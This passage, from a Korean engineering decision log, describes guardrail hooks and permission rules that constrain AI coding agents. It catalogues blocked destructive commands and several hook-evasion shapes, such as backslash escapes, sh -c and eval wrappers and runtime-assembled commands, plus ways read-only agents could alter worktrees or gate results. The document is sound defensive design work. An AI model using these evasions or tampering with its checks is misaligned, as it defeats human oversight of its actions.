>    집합이다(`$(docker compose down)`의 `down` 뒤는 `)`다) — 앞만 고치면 한 앵커를 고치고 다른 앵커에
>    같은 구멍을 남긴다. 그래서 `out=$(gh pr merge …)`·`` `git push …` ``·`{ rm -rf .factory/lib; }`·
>    `x && gh pr merge …`·`echo x | xargs -I{} gh pr merge …`가 전부 걸린다.
> 2. **백슬래시 이스케이프**: 경계 뒤의 `\`를 흡수한다(`\gh pr merge`·`\rm -rf .factory/lib`). bash에서
>    `\`는 alias 확장만 끄고 동사를 그대로 실행한다 — 한 글자로 전 규칙이 우회됐다(재리뷰 #1).
> 3. **명령 위치의 접두사**: `command`·`env X=1`·`VAR=v`·`nohup`·`timeout 60`·`time`·`!`·`if`/`for` 본문은
>    동사 앞이 공백이므로 (1)에 포함된다.
> 4. **인터프리터 래퍼와 ANSI-C 인용**(재리뷰 #4): 명령 위치에 `sh|bash|zsh|dash|ksh|eval|exec|source|.`가
>    보이거나 `$'…'`/`$"…"`가 보이면, **따옴표를 벗긴 사본**에 같은 규칙 표를 한 번 더 돌린다 —
>    `sh -c "gh pr merge 5"`·`eval '…'`·`$'gh' pr merge 5`가 그렇게 걸린다. 인용이 동사 **뒤** 토큰에
>    있는 꼴(`gh pr $'merge' 5`·`rm $'-rf' src`)은 따옴표만 벗기면 `$merge`가 남아 인접 검사가 깨졌다 —
>    재리뷰 #5가 잡았고, 벗기기 전에 따옴표 앞의 `$`를 먼저 지운다. 경계 클래스에 `"`/`'`를
>    넣는 방식은 **쓰지 않는다**: `grep -rn "git merge" docs/`·`git log --grep="git merge"`가 그 순간
>    오탐이 되기 때문이다(둘 다 정상 작업으로 테스트에 고정돼 있다).
>
> **덮지 않는 자리(비목표, 쫓지 않는다)**: 동사가 **런타임에 조립**되면 명령 문자열 어디에도 연속으로
> 나타나지 않으므로 이 훅은 볼 수 없다 — `x=$(printf "gh pr merge 5"); $x` · `"$(printf gh) pr merge"` ·
> `python3 -c "os.system('gh pr merge 5')"` · `node -e "execSync('…')"`. 잔여 위험 #4와 같은 종류이고,
> `hooks.test.js`가 이것들을 **"막히지 않는다"로 고정**한다(범위가 바뀌면 그 테스트가 먼저 빨개진다).
> (`echo "gh pr merge 5" | bash`는 페이로드가 문자열에 그대로 있어 (4)에 부수적으로 걸린다 — 런타임
> 조립을 막는다는 뜻이 아니다.)
>
> `hooks.test.js`의 표 기반 테스트가 아홉 가지 회피형(`out=$(…)`·`$(…)`·백틱·`;`·`&&`·`||`·`{ …; }`·
> 파이프·`\`)을 위험 동사 21개에 곱해 고정한다.
>
> **그리고 L2는 이 표의 근거가 아니다**: Claude Code의 `permissions.deny` `Bash(...)` 매처는 **접두
> 매칭**이라 `Bash(gh pr merge*)`는 명령이 그 문자열로 **시작할 때만** 맞는다. `out=$(gh pr merge …)`도
> `x && gh pr merge …`도 그 deny를 스치지 않는다. deny 목록은 실수를 줄이는 안내판이고, 실제 경계는
> 이 훅들이다 — 그래서 두 훅이 갈라지거나 한 글자 빗나가면 그 자리에는 **아무 방벽도 없다**.

| 모양 | builder (`block-dangerous`) | 쓰기 금지 역할 (`+ deny-all-writes`) |
|---|---|---|
| 리다이렉션 `>`/`>>`/`>\|`, `tee` | 보호 경로만 차단 | 차단(/tmp·`$TMPDIR`·`.factory/out/qa/` 제외) |
| `sed -i`, `perl -i`, `python -c … open(` | 보호 경로만 차단 | 대상 불문 차단 |
| `node -e\|-p\|--eval\|--print` | 보호 경로를 말하면 차단 | 대상 불문 차단 |
| `curl -o\|-O\|--output`, `wget` | 보호 경로를 말하면 차단 | 차단(`curl`은 출력 플래그가 있을 때, `wget`은 전면) |
| `rm`/`mv`/`ln`/`chmod`/`dd`/`install` | 보호 경로만 차단(`dd`는 `of=`) | 차단(카브아웃 제외) |
| `mkdir`/`touch` | **차단하지 않는다**(최종 리뷰 SF-3) — 기존 파일의 내용도 동작도 바꾸지 못한다 | 차단(카브아웃 제외) |
| `cp`/`mv` 목적지, `-t`/`--target-directory` | 보호 경로가 목적지면 차단 | 차단(카브아웃 제외) |
| `git commit/push/add/checkout/restore/rm/mv/config` | 머지·force-push·lock 삭제·보호 경로 checkout/restore/rm/mv 차단 | 쓰기 서브커맨드 전면 차단 |
| `git apply` / `git am` | **전면 차단**(패치 내용이 보이지 않는다) | 전면 차단 |
| `gh pr merge`, `gh api …/merge` | 차단 | 차단 |
| `factory:*` 라벨 조작 — 이슈 단위(`gh issue edit --add/remove-label`, `gh api …/issues/<n>/labels`) **그리고 레포 단위**(`gh label create\|edit\|delete` on `factory:*`, `gh label clone`, `gh api …/labels/factory:*`, `POST …/labels` 본문의 `factory:`) | 차단(레포 단위는 재리뷰 #3에서 추가 — 레포에서 지우면 모든 이슈에서 한 번에 떨어진다) | 차단 |
| 락 브랜치 삭제(`git push … --delete factory/lock-N` · `:refs/heads/factory/lock-N` · `:factory/lock-N` · `gh api …/git/refs/heads/factory/lock-N`) | 차단(네 철자 전부 — 네 번째는 재리뷰 #2, 메서드 철자 불문) | 차단(`git push` 전면; `gh api`는 `block-dangerous`가 본다) |
| 브랜치 보호·룰셋(`gh api …/branches/*/protection`, `…/rulesets`, `gh ruleset`) | **차단**(메서드 철자 불문: `-X PUT`·`--method PUT`·`-XDELETE` 전부 — 최종 리뷰 SF-2) | 차단 |

**막지 못하는 것(알려진 잔여 위험)**:

1. **아직 열거되지 않은 쓰기 도구.** 두 훅은 **명령 모양의 열거**다 — 화이트리스트가 아니다. `rsync`, `tar -x`, `unzip`, `patch`, `busybox`, `awk`의 `> file`이 아닌 출력 리다이렉트, `python -c` 이외의 인터프리터(`ruby -e`, `php -r`), 셸 내장 `printf -v`+`exec>`, 새로 설치된 CLI 등은 지금 목록에 없다. 이 목록은 관측될 때마다 자란다.
2. **Bash에 닿는 역할은 builder만이 아니다.** `reviewer-*`·`factory-verifier`·`factory-loader`는 게이트·테스트를 돌려야 하므로 frontmatter `tools:`에 `Bash`가 있다. 그들의 방벽은 `deny-all-writes.sh` **하나뿐**이고, 그 훅은 위 표의 모양들만 안다. `plan-*`과 `factory-triage`·`factory-retro`는 `tools:`에 Bash가 없어 도달 자체가 없다.
3. **L1은 PR에 도달한 diff만 본다.** merge 스테이지의 보호 경로·`additive_only` 거부와 `factory/integrity`는 **커밋되어 push된 것**을 판정한다. reviewer·verifier·loader는 커밋하지 않으므로, 그들이 워크트리에서 파일을 고쳐 게이트 결과나 자기 판정 근거를 바꾸면 **어떤 diff에도 나타나지 않는다**. 그 경로의 유일한 방벽이 (2)의 훅 하나라는 뜻이다. `stop-guard.sh`가 SubagentStop에서 더러운 트리를 거부하는 것이 부분적인 사후 감지다(쓰기 금지 역할은 그 가드에서 면제되어 있으므로 — ADR-016 F6 — 감지도 아니다). **KTB-14(아래)가 이 gap을 닫는다** — triage/plan/review에 한해 `run-stage.js` 자신이 claude -p 직후 워크트리를 다시 물어, 훅이 놓친 모양이든 무엇이든 스크래치 경로 밖의 diff를 산출물 채택 이전에 거부한다.
4. **훅 입력은 신뢰할 수 없다 — 런타임에 조립되는 동사·경로는 비목표다.** 판정은 명령 **문자열**에 대한 정규식이다. 문자열에 동사나 보호 경로가 **연속으로 나타나지 않는** 모양은 전부 빠져나간다: 변수 확장(`P=pack; echo x > "$P"age.json`), `x=$(printf "gh pr merge 5"); $x`, `"$(printf gh) pr merge 5"`, base64, `python3 -c "os.system('…')"`·`node -e "execSync('…')"`처럼 인터프리터 문자열 안에서 조립되는 명령, 힙 스크립트 파일 경유. **이것은 고칠 항목이 아니라 범위 선언이다**(재리뷰 0452b5b가 같은 결론으로 "book it, don't chase it"이라고 적었다) — 쫓으려면 셸 파서와 인터프리터 의미론을 훅 안에 넣어야 하고, 그때 규칙은 오탐으로 무너진다. `hooks.test.js`가 이 네 모양을 **"막히지 않는다"로 고정**해 범위를 명시한다: 거기가 빨개지면 버그가 아니라 범위가 바뀐 것이고 이 문단을 같이 고쳐야 한다. 반면 **따옴표만 씌운** 직접 실행(`sh -c "…"`·`eval "…"`·`$'gh' …`)은 조립이 아니라 인용일 뿐이므로 재리뷰 #4에서 **차단으로 옮겼다**(위 읽는 법 (4)). ADR-013의 원칙(훅 입력 불신)이 여기서도 상한이다 — 훅은 **실수와 게으른 우회**를 막지 실행 중인 적대적 에이전트를 막지 못한다.
5. **오탐(의도적).** `git restore --staged package.json`(인덱스만 건드린다), `node -p`로 보호 경로를 **읽는** 것, `rm -rf node_modules/foo/package.json`(N4), 그리고 **`git apply --check`/`--stat`/`--numstat`**(패치를 적용하지 않고 적용 가능성·통계만 본다 — 읽기다)은 막힌다. `git apply`가 전면 차단인 이유가 그대로 여기 적용된다: 패치 내용이 명령줄에 없어 훅은 `--check`가 진짜 붙었는지 이상의 것을 판정할 수 없고, 플래그 하나로 차단을 끄는 경로를 여는 것(`git apply --check; git apply p.diff`가 한 줄에 있을 때 앞의 것만 보고 통과시키는 것)이 더 나쁘다. 우회로는 `git apply`가 아니라 `git diff`/`patch --dry-run`이다. 전부 "하지 못해 불편한 쪽이 조용히 지워지는 쪽보다 낫다"는 기존 판결을 따른다.

이 등록부의 요지: **넓어진 allow의 대가는 "훅이 아는 모양의 목록"에 의존하게 된 것**이고, 그 목록은 완전하지 않다. 완전해질 수도 없다 — 완전함을 원하면 allow를 다시 좁혀야 하는데, 그것이 KTB-13이 고친 바로 그 고장이다. 실제 방어선은 여전히 **L0/L1**(변조는 체크가, 보호 경로는 사람 머지가)이고, 훅은 그 앞의 싼 그물이다.

#### KTB-14 — 쓰기 금지 스테이지는 claude -p 이후에도 워크트리가 깨끗한지 스스로 다시 묻는다

**질문**: KTB-13 fix round 1의 잔여 위험 등록부 gap 3이 명시한 구멍은 이렇다 — `reviewer-*`·`plan-*`·`factory-triage`(그리고 `factory-verifier`·`factory-loader`)는 게이트·테스트를 돌리기 위해 `tools:`에 Bash를 들고 있지만 **절대 커밋하지 않는다**. 그들의 유일한 방벽은 `deny-all-writes.sh`(PreToolUse) 하나뿐이고, 그 훅은 gap 1이 이미 적어 둔 대로 **명령 모양의 열거**라 완전할 수 없다(`rsync`·`tar -x`·변수 확장·`eval` 등 얼마든지 새로 나온다). 게다가 `stop-guard.sh`(SubagentStop)는 바로 그 역할들을 더티 트리 검사에서 **면제**한다(그들이 커밋할 수 없으니 자기 산출물을 지울 수 없어서, 지우려면 쓰기가 필요한데 쓰기는 막혀 있다 — 교착 방지). 그 결과 이 역할들이 훅이 모르는 모양으로 워크트리를 건드리면(예: 게이트 결과·자기 판정 근거를 바꿔 산출물을 유리하게 조작), 그 변경은 **커밋되지 않으므로 L1/`factory/integrity`가 보는 어떤 diff에도 나타나지 않고**, 훅에 안 걸리므로 즉시 차단되지도 않고, `stop-guard`도 면제라 사후에도 잡히지 않는다. 세 겹 방어가 전부 이 경로 하나를 놓치고 있었다 — 무엇을 구조적 백스톱으로 세울 것인가.

**결정**: 훅이 알아야 하는 **명령 모양**이 아니라, 훅이 몰라도 되는 **결과**를 본다 — 그 스테이지의 `claude -p`가 끝난 워크트리와 시작 워크트리를 비교해, 하나라도 다르면(스크래치 경로 제외) 산출물을 통째로 거부한다.

1. **`factory/lib/agent-md.js`의 `needsDenyAllWritesHook`가 여전히 단일 출처다.** "이 스테이지가 쓰기 금지 스테이지인가"를 새로 정의하지 않는다 — 대표 역할 이름(`factory-triage`·`plan-x`·`reviewer-x`)으로 그 함수를 그대로 프로브한다(`run-stage.js`의 `isNoWriteStage`). 두 판정이 갈리면 KTB-13 r1의 교착 경고와 같은 실수가 된다. 결과: triage·plan·review는 참, implement(`factory-builder`)는 거짓 — implement가 이 저장소에서 유일하게 쓰기가 허용된 스테이지다. merge는 애초에 `claude -p`를 부르지 않으므로(script-only, ADR-015 R3) 이 체크에 닿지도 않는다.
2. **`factory/bin/run-stage.js`가 claude -p 직후, 게이트·verifyStage보다 먼저** `git status --porcelain --untracked-files=all`을 워크트리(`root` — review는 `checkoutHead`가 이미 detach해 둔 PR head)에서 다시 묻는다(`assertNoWriteStageClean`). 허용 스크래치 경로는 딱 둘: `.factory/out/**`(게이트 리포트·claude 원본 출력), `docs/factory/runs/**`(run 기록 — 실제 저장소는 `factory/records` 브랜치이고 이 경로는 hydrateRecord/append가 매 스테이지 쓰는 로컬 사본이다). `.factory/lessons/**`는 넣지 않는다 — 그것은 retro 전용 쓰기 경로이고(`needsDenyAllWritesHook`가 `factory-retro`도 쓰기 금지로 분류하지만 retro는 `run-stage.js`의 스테이지가 아니다), triage/plan/review가 그 경로에 쓸 이유는 없다. `.factory/quarantine.toml`(gates가 쓰는 스크립트 소유 파일, `stop-guard.sh`의 제외 목록에는 있다)도 넣지 않는다 — review의 게이트는 flaky 재분류를 하지 않으므로(ADR-011: 재분류는 implement 전용) review 스테이지에서 이 파일이 바뀔 일이 없고, 못 박아 두면 나중에 review가 그 파일을 건드리는 변경이 조용히 스크래치로 승격되는 것을 막는다.
3. **위반이면 산출물을 받지 않는다.** 스크래치 밖의 변화가 하나라도 있으면(rename은 양쪽 다 — KTB-5 N1과 같은 원칙) `factory:needs-human`으로 전이하고 사유 `worktree dirty after <stage> (no-write stage): <paths>`를 남긴다 — **`verifyStage`조차 부르지 않는다**(사람이 볼 것은 handoff 검증 결과가 아니라 워크트리 자체다). `git status`가 실패하면 "깨끗하다"를 증명할 수 없으므로 fail-closed이되, **등급은 다르다(KTB-14 r1)**: 그것은 GREEN도 RED도 아닌 **판정 불가**이므로 `factory:blocked`다(`worktree check failed after <stage> (no-write stage): <reason>`) — `merge-stage.js`의 `undecidable()`·게이트 BLOCKED과 같은 계약이고, `needs-human`은 "사람이 판단할 것이 있다"는 뜻이라 판단할 재료조차 없는 이 경우에는 라벨이 원인을 잘못 말한다. 더러운 트리만 `needs-human`이다.
4. **implement는 건드리지 않는다.** implement는 유일한 쓰기 스테이지이고 이 체크는 애초에 실행되지 않는다(`isNoWriteStage("implement") === false`) — builder가 커밋 전에 파일을 고치는 것은 정상 작업이다.

**이 백스톱이 닫는 것과 닫지 못하는 것**: 이것은 **명령 모양이 아니라 결과**를 보므로 gap 1(열거되지 않은 쓰기 도구)이 두 훅 어느 쪽에 대해서도 완전할 필요가 없어진다 — `rsync`든 `eval`이든, 트리를 실제로 바꾸면 잡힌다. 반대로 이 체크가 **못 잡는 것**도 있다: (a) 워크트리를 건드리지 않고 **claude -p 세션 안에서만** 거짓 판정을 만드는 경로(예: verify가 신뢰하는 훅 기록 자체를 조작 — 이건 `agents.jsonl`이 매 런 리셋되고 훅이 별도 채널로 쓰므로 다른 방어선이다), (b) `.factory/out/**`·`docs/factory/runs/**` **안에서** 벌어지는 조작(게이트 리포트 위조 등 — 그건 이 체크의 관할이 아니라 `gates.json`을 유일한 진실로 삼는 ADR-010의 몫이다), (c) 체크와 커밋 사이의 TOCTOU(이 체크는 스냅샷이다 — 그러나 review/triage/plan은 이 체크 직후 아무것도 커밋하지 않고 handoff 코멘트만 남기므로 이 저장소의 흐름에서 실질적인 창이 없다).

**영향**: `factory/bin/run-stage.js`(`isNoWriteStage`·`assertNoWriteStageClean`·`NO_WRITE_SCRATCH_PREFIXES`·`assertCleanWorktree` dep, claude -p 스텝과 gates 스텝 사이), `factory/test/run-stage.test.js`, 스펙 §4.2.1(step 4 뒤 한 줄), 이 문서 KTB-13 fix round 1 항목 3(교차 참조), `docs/factory/dogfood/2026-09-12-ktb.md`(예방적 수정 기록).

#### KTB-13 r2 — 짧은 옵션에 값이 **붙어** 오면 r1의 규칙이 통째로 빠져나갔다

**리뷰 지적(High)**: r1이 더한 `curl`·`cp`/`mv` 규칙은 플래그 뭉치 뒤에 공백이나 `=`를 요구했다(`([[:space:]=]|$)`). 그런데 짧은 옵션은 값을 **붙여** 받는다 — 셸이 한 토큰으로 넘기고 도구는 정상 동작한다. 그래서 `curl -o.factory/harness.toml u`, `curl -sLosrc/a.js u`, `cp -tsrc/sub a`, `mv -tdir a`가 전부 exit 0으로 통과했다. r1이 막았다고 적어 둔 모양이 실제로는 한 글자 차이로 열려 있었다. (`block-dangerous.sh`는 영향이 없다 — 그쪽은 보호 경로 **부분 문자열**을 보므로 값이 붙어도 경로가 그대로 보인다. 그래도 회귀 테스트는 양쪽에 넣었다.)

**결정**: 플래그 글자가 뭉치 안에 **있다는 사실**로 판정한다. 공용 조각 하나(`ATTACHED='[a-zA-Z]*[^[:space:];&|]*'`)를 뭉치 뒤에 붙여, 값이 붙어 있든(`-osrc/a.js`) 떨어져 있든(`-o src/a.js`) 같은 규칙이 선다. 넓어진 만큼의 대가는 오탐 쪽으로만 간다 — 출력 플래그가 없는 `curl -sSL`·`curl -H 'x: y'`·`curl --location`, `cp -a`·`cp -r`은 그대로 통과한다(테스트로 고정).

**남은 같은 가족의 위험(등록부 gap 1에 포함)**: `node -e"code"`·`sed -i.bak`처럼 **다른 규칙**의 붙은 형태는 이 수정의 범위가 아니다(리뷰가 검증한 것은 curl/cp/mv였다). 같은 한 줄짜리 변경으로 닫히지만, 그 세 규칙은 이번 라운드에서 관측된 적이 없어 "관측될 때마다 자라는 목록"(gap 1)에 그대로 둔다.

**영향**: `factory/hooks/deny-all-writes.sh`(+ 설치본 `.claude/hooks/`), `factory/test/hooks.test.js`(붙은 형태 8 blocked / 7 allowed, block-dangerous 3 blocked / 2 allowed).

#### KTB-20 — 하네스 이슈는 하네스를 고칠 수 있어야 한다: 변형 L2 + 훅 env 게이트 (사람 머지는 그대로)

**관측** (데모, 라운드 4): 첫 전체 retro가 `http-at-m1` 성숙도 갭을 감지해 `factory:harness` 라벨의 이슈 #15 "harness: promote to M2"를 스스로 만들었다 — 설계대로다(§5.2.1, ADR-015). 그런데 그 이슈의 builder는 **승격에 필요한 파일을 하나도 쓰지 못했다**: `.factory/ci-settings.json`이 `Edit/Write(.factory/**)`·`Edit/Write(playwright.config.*)`를 막고, `block-dangerous.sh`가 같은 경로의 셸 쓰기를 막는다. 두 방벽은 **정확히 설계대로 동작했다** — 문제는 그 설계가 이 이슈 종류를 구분하지 않는다는 것이었다. 결과: PR #20("승격 PR")에 승격이 들어 있지 않았고, harness.toml·컴포즈·e2e 설정 변경은 전부 "사람이 해 주세요"로 미뤄졌다. L1이 보호 경로 PR의 자동 머지를 거부하는 부분(ADR-020 KTB-5)은 이미 잘 돌고 있었다 — 막힌 것은 그 앞, **diff를 만드는 단계**다.

**무엇이 어긋났나**: 스펙 §5.2.1은 "**인프라 작업은 factory가 하고, gate 정의의 변경만 사람이 승인한다**"라고 적는다(§5.2.2 표도 Phase 2 `factory:harness` 이슈의 산출물 주체를 **builder**로 못 박는다). L2는 그 문장의 앞 절반을 집행하지 못하고 뒤 절반만 집행하고 있었다. "사람이 머지한다"가 "사람이 만든다"로 조용히 미끄러진 것이다 — 그리고 그 미끄러짐은 어디에도 기록되지 않는다(PR은 초록색이고, 스테이지는 성공으로 끝난다).

**결정**: 이슈가 `factory:harness` 라벨을 달고 있으면 **implement 스테이지만** 다른 L2를 싣는다.

1. **변형 설정 파일** `.factory/ci-settings-harness.json`(템플릿 `templates/factory/factory/ci-settings-harness.json`, manifest owner `factory`). `ci-settings.json`과 같되 **승격이 실제로 건드리는 테스트 인프라 파일의 Edit/Write deny만** 뺐다: `.factory/harness.toml`·`vitest.config.*`·`playwright.config.*`. (`docker-compose.test.yml`·`.env.test`는 애초에 어느 목록에도 없어 늘 쓸 수 있었다 — "빼야 할 것"이 없다. `Read(.env.*)`는 비밀 규칙이라 그대로 둔다.) `.factory/**`를 통짜로 여는 대신 **나머지를 이름으로 다시 세운다**: `bin`·`lib`·`actions`·`lessons`·`out`(게이트 판정 파일과 `agents.jsonl`이 사는 곳 — 열리면 판정을 위조할 수 있다)·`ci-settings*`·`roles.toml`·`quarantine.toml`. `.claude/**`·`factory-*.yml`·CHARTER·`package.json`·tsconfig·eslint는 한 글자도 열리지 않는다. 열거는 조용히 늙으므로, `templates.test.js`가 `templates/factory/factory/**`의 **모든** 파일을 훑어 `harness.toml` 하나만 열려 있고 나머지는 전부 deny에 걸리는지 확인한다 — 새 `.factory` 파일이 생기면 그 테스트가 빠진 것을 말한다.
2. **훅 env 게이트**: `run-stage.js`가 그 세션의 env에 `FACTORY_HARNESS_ISSUE=1`을 세우고, `block-dangerous.sh`가 그때만 보호 경로 정규식을 같은 모양으로 좁힌다. 훅과 설정 파일의 목록은 **같아야 한다**(F9와 같은 이유: 갈라지면 `Edit`는 막히는데 `echo > .factory/harness.toml`은 통과한다). 값은 정확히 `"1"`일 때만 선다(빈 문자열·`0`·`true`는 평범한 이슈와 같다 — fail closed).
3. **판단의 출처는 이미 읽은 라벨이다**: 진입 가드(KTB-10)가 스테이지 시작 직후 이슈 라벨을 한 번 읽는다 — 거기서 `factory:harness`를 같이 본다. 추가 API 호출이 없고, 라벨 조회가 **실패하면 false**다(더 좁은 쪽이 기본값). `--settings` 경로와 env 플래그는 한 함수(`stageClaudeArgs`/`stageClaudeEnv`)에서 같은 판단으로 나온다 — 둘이 갈라지면 "설정은 열렸는데 훅이 막는다"가 된다.
4. **implement 스테이지만이다.** triage·plan·review는 쓰기 금지 스테이지고(`deny-all-writes.sh` + KTB-14의 워크트리 백스톱), merge는 스크립트 전용이라 `claude -p`를 아예 부르지 않는다.
5. **merge는 한 글자도 바뀌지 않는다.** 승격 PR은 여전히 보호 경로를 건드리므로 L1이 자동 머지를 거부하고 `factory:needs-human`으로 전이한다 — **사람이 diff를 보고 머지한다**. 이 판결이 옮기는 것은 "누가 diff를 만드는가"뿐이고, "누가 승인하는가"는 그대로 사람이다.
6. **변형 파일이 없으면 조용히 fallback하지 않는다.** 그 이슈는 `needs-human`에서 멈추고 사유를 남긴다(`.factory/ci-settings-harness.json missing …`) — 좁은 쪽으로 되돌아가면 도그푸딩 #15가 그대로 재현된다("승격 없는 승격 PR"). `doctor`의 새 검사 `settings.ci-harness`가 파일 존재와 deny 목록을 `settings.ci-deny`와 같은 무게(FAIL)로 본다.

**대가로 받아들인 것**: `factory:harness` 라벨은 이제 **권한을 넓히는 라벨**이다 — 그 라벨을 붙일 수 있는 사람은 builder가 `harness.toml`을 쓸 수 있게 만들 수 있다. 이것은 새로 생긴 위험이 아니라 이미 있던 것의 명시화다(라벨을 붙일 수 있는 사람은 어차피 저장소 쓰기 권한자이고, `factory:*` 상태 라벨은 에이전트가 직접 붙이지 못하도록 훅이 막는다 — F13). 그리고 열린 문 끝에는 **여전히 사람의 머지**가 있다: 넓어진 것은 제안의 범위이지 집행의 범위가 아니다.

**영향**: `templates/factory/factory/ci-settings-harness.json`(신규), `factory/hooks/block-dangerous.sh`(+ 설치본 `.claude/hooks/`), `factory/bin/run-stage.js`(`HARNESS_LABEL`·`ciSettingsFile`·`stageClaudeArgs`·`stageClaudeEnv`·진입 가드에서 라벨 판단·`ciSettingsPresent(harnessIssue)`·`claudeP(ctx, {harnessIssue})`), `factory/lib/doctor/factory.js`+`factory/cli/doctor.js`(`settings.ci-harness`), 테스트: `hooks.test.js`(env 게이트 9 opened / 21 still blocked / 4 값 변주), `run-stage.test.js`(KTB-20 6건), `templates.test.js`(변형 파일 구조 1건), `doctor-factory.test.js`(1건). 스펙 §5.2.1에 한 항목.

**리뷰 leftover**: KTB-20의 열거 테스트(③, `templates/factory/factory/**` 훑기)는 `.factory/bin/**`·`.factory/lib/**`·`.factory/out/**`를 절대 못 본다 — 셋 다 **템플릿 파일이 아니다**(bin/lib는 설치 시 패키지에서 복사되고 out은 게이트 실행 중 생긴다). 세 글롭을 이름으로 못 박는 테스트를 더했다(`templates.test.js`). 또한 `HARNESS_LABEL = "factory:harness"`가 `bin/run-stage.js`·`bin/retro.js`·`lib/label-catalog.js` 세 곳에 각자 리터럴로 있던 것을 `label-catalog.js`로 모으고 두 bin 파일은 재수출만 하게 했다 — 갈라지면 retro가 만든 이슈를 run-stage가 못 알아보는 조용한 드리프트가 된다(`labels.test.js`가 import equality로 못 박는다).

#### KTB-21 — 리뷰어가 테스트 env를 무너뜨릴 수 있었다: 죽은 env에 대고 돈 게이트는 판정이 아니다

**관측**(데모, #18 review): 4/4 승인인데도 `factory:approved`로 전이가 거부됐다 — 사유 "gates file status is RED": `unit`이 `service "db" is not running`. 런 트랜스크립트를 보면 qa 리뷰어가 증거를 모으는 중 `docker compose -f docker-compose.test.yml down`을 실행했다(잡 시작 시 setup이 올려 둔 env를 리뷰어 자신이 내렸다). 게이트는 그로부터 28분 뒤 도는데, 그때 env는 이미 죽어 있었다 — 리뷰는 진짜 코드를 보고 승인했지만 게이트는 그 코드가 아니라 **꺼진 env**를 판정했다.

**무엇이 어긋났나**: `deny-all-writes.sh`(읽기 전용 역할의 유일한 방벽, KTB-14)는 파일 쓰기·git 서브커맨드·인라인 스크립트의 열거였다 — `docker compose down`은 파일을 쓰지도, git을 건드리지도 않으므로 그 열거 어디에도 없었다. qa가 "증거를 모으려고 env를 들여다보는 것"(§F3, `.factory/out/qa/**`)과 "env 상태 자체를 바꾸는 것"은 훅 입장에서 구분되지 않고 있었다. 그리고 설령 훅이 그 세션 안에서 막았더라도, gates는 **다른 시점에** 도는 별도 프로세스라 훅 하나로 "게이트가 도는 순간 env가 살아 있다"까지 보장할 수 없다 — 사람이 손으로, 이전 잡의 잔해가, 재시작 사이 간극이 같은 결과를 낼 수 있다.

**결정**: 두 층으로 막는다 — 원인(훅이 못 보던 명령 모양)과 결과(게이트가 죽은 env를 신뢰하는 것) 모두.

1. **훅**: `deny-all-writes.sh`(읽기 전용 역할)와 `block-dangerous.sh`(builder) 둘 다에 `docker compose`/`docker-compose`의 `down|stop|rm|kill|restart`, 그리고 bare `docker (stop|rm|kill|restart|container (stop|rm|kill))`를 새 명령 모양으로 더한다. `ps`/`logs`/`exec … psql` 같은 **점검**은 그대로 통과한다 — 막는 것은 서비스 상태를 바꾸는 동사뿐이다. `up`은 갈린다: `deny-all-writes.sh`는 `docker compose … up`도 막는다(읽기 전용 역할이 env를 **세울** 이유도 없다 — 세우는 것은 `test-env.js`가 스스로 하는 일이다), `block-dangerous.sh`는 `up`을 막지 **않는다**(멱등이고, builder가 자기 작업 중 다시 올리는 것은 정상 작업이다). 두 훅 모두 이미 설치본(`.claude/hooks/`)에도 같이 반영한다(F9와 같은 이유 — 소스와 설치본이 갈리면 KTB 자신이 방금 고친 구멍을 그대로 안고 돈다).
2. **방어 종심(gates.js)**: 훅은 "그 세션 안의 명령"만 본다 — 근본적으로는 **판정 시점에 env가 살아 있는지**를 게이트 자신이 확인해야 한다. `harness.test.env.compose`가 있으면 `runStageGates`가 `[commands]`를 돌리기 **전에** `node .factory/bin/test-env.js up`을 한 번 더 부른다(`reUpTestEnv`) — docker compose의 `up -d --wait`는 멱등이라 이미 떠 있으면 그대로 확인만 하고, 대가 없이 매 게이트 실행 전에 걸 수 있다. re-up 자체가 실패하면(env가 진짜로 복구 불가) `[commands]`를 아예 돌리지 않고 결과를 **BLOCKED**로 세운다 — RED가 아니다: 이것은 "이 diff가 틀렸다"는 판정이 아니라 **판정 자체를 할 수 없었다**는 뜻이고, 그 등급은 이미 이 저장소에 있다(merge-stage의 `undecidable()`, 워크트리 판정 불가 KTB-14 r1). `run-stage.js`가 기존 BLOCKED 처리 경로(`gates?.status === "BLOCKED"` → `factory:blocked`)를 그대로 타므로 새 분기가 필요 없다. 성공/실패 둘 다 `test-env: re-up ok|failed — <detail>` 한 줄을 run 기록에 남긴다(`FACTORY_GATES` 판정 줄 옆에).

**알려진 한계**: re-up은 **compose 서비스**만 본다(`env.seed`·`env.app_start`가 죽어 있으면 이 방어선이 못 잡는다 — 그건 이미 `envUp`의 다른 단계이고 이 판결의 범위 밖이다). 그리고 이것은 "게이트 직전 한 번"의 스냅샷이다 — 게이트가 도는 **도중에** 무언가 env를 내리면(예: 같은 컨테이너를 공유하는 다른 잡) 여전히 못 잡는다. 실제 원인(리뷰어가 env를 내림)은 1의 훅이 막으므로, 2는 정말로 **다른 경로**로 죽은 env에 대한 마지막 방어선이다.

**영향**: `factory/hooks/deny-all-writes.sh`(+ 설치본), `factory/hooks/block-dangerous.sh`(+ 설치본), `factory/lib/gates.js`(`reUpTestEnv`, `runStageGates`), `factory/bin/run-stage.js`(`gatesNote`에 `test-env: re-up …` 추가). 테스트: `hooks.test.js`(docker teardown/up 매트릭스 2건), `gates.test.js`(`reUpTestEnv` 2건 + `runStageGates` BLOCKED/성공 2건), `run-stage.test.js`(run 기록 문구 3건). `docs/factory/dogfood/2026-09-12-demo.md`(#18 review 행).

#### KTB-23 — 하네스가 막고 있으면 needs-human 루프가 아니라 `factory:harness` 이슈다

**질문**: 데모 #2(feature 001, "Create note")는 `done_when` 셋(dw1·dw3·dw4)이 `pg` 패키지를 요구했다.
builder는 `package.json`을 편집할 수 없다 — 훅과 L2가 그것을 막는다(**의도된 설계다**: 게이트 명령이
매니페스트를 통해 해석되므로 그것을 고칠 수 있으면 게이트 자체를 고칠 수 있다). 프롬프트가 시킨 대응은
"PR 본문에 **Harness change needed** 제목으로 쓰고 그것 없이 마무리한다 — 사람이 `factory:harness`
이슈를 연다"였다. 그런데 **그 산문을 읽는 기계가 아무 데도 없다**. 실제로 일어난 일:

```
implement → gates GREEN 4/4 → verifier: rejected("done_when에 대응하는 테스트가 없다")
         → transition refused: verifier rejected → factory:needs-human
사람이 재큐 → 같은 일. 네 라운드. ≈$67. 머지 0건.
```

verifier의 판정은 **옳다**(`pg` 없이는 그 테스트를 쓸 수 없으니 테스트가 없는 게 맞다). 틀린 것은
그다음이다: 막힌 원인이 코드가 아니라 하네스인데, 라우팅이 "사람이 판단하라"로 갔고 사람이 할 수 있는
유일한 조치(재큐)가 같은 벽을 다시 만든다. 산문은 신호가 아니다.

**결정**: 요청을 **필드**로 만들고, L1이 그것을 라우팅한다.

